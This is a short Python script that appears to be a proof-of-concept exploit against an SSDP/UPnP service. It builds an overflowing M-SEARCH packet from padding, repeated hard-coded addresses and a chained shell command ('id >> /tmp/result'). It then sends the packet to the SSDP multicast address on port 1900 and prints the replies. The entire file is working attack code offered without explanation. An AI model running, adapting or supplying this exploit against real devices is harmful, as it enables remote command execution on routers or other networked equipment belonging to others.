import socket
from struct import pack,unpack

p = lambda x : pack("<L", x)

cmd = b"id >> /tmp/result"

payload = b'MX:' 
payload += b'A' * 69
payload += p(0xffff0f90)
payload += b'B' * 67
payload += p(0xffff0f90)
payload += b'\r\n'

explayoad = b'A' * 24 + p(0xffff0f90)
explayoad += b"C" * 140 + p(0xffff0f90)
explayoad += b"D" * 120 + p(0xffff0f90) + b"D" * 16 + p(0xffff0f90)
explayoad += b"E" * 120 + p(0xffff0f90) + b"E" * 16 + p(0xffff0f90)
explayoad += b"F" * 120 + p(0xffff0f90) + b"F" * 16 + p(0xffff0f90)
explayoad += b"G" * 120 + p(0xffff0f90) + b"G" * 16 + p(0xffff0f90)
explayoad += b"H" * 120 + p(0xffff0f90) + b"H" * 16 + p(0xffff0f90)
explayoad += b"I" * 120 + p(0xffff0f90) + b"I" * 16 + p(0xffff0f90)
explayoad += b"J" * 120 + p(0xffff0f90) + b"J" * 16 + p(0x0003FF98)
explayoad += b"C" * 120 + p(0x0002C528) + cmd

msg = payload
msg += b'M-SEARCH * HTTP/1.1\r\n'
msg += b'MAN: "ssdp:discover"\r\n'
msg += explayoad

# Set up UDP socket
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
s.settimeout(2)
s.sendto(msg, ('239.255.255.250', 1900) )

try:
    while True:
        data, addr = s.recvfrom(65507)
        print (addr, data)
except socket.timeout:
    pass
